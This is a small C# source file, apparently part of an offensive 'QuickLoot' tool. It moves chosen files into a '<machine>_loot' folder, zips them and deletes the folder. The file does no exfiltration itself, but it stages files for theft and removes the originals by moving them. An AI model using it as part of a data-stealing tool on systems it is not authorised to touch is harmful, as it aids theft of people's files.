using System;
using System.IO;
using System.IO.Compression;

namespace QuickLoot
{
    internal class Zipper
    {
        private static void MoveFileToFolder(string filePath, string destinationFolder)
        {
            if (File.Exists(filePath))
            {
                string fileName = Path.GetFileName(filePath);
                string destinationPath = Path.Combine(destinationFolder, fileName);
                File.Move(filePath, destinationPath);
            }
            else
            {
                Console.WriteLine($"[!] File not found: {filePath}");
            }
        }

        public static string ZipFiles(string[] files)
        {
            string lootFolder = $"{Environment.MachineName}_loot";
            Directory.CreateDirectory(lootFolder);

            foreach (string file in files)
            {
                if (File.Exists(file))
                {
                    MoveFileToFolder((string)file, lootFolder);
                }
            }

            string zipFile = $"{lootFolder}.zip";
            ZipFile.CreateFromDirectory(lootFolder, zipFile);

            Console.WriteLine($"[*] Loot zipped into {zipFile}");
            try
            {
                Directory.Delete(lootFolder, recursive: true);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Failed to delete folder: {ex.Message}");
            }

            return zipFile;
        }
    }
}
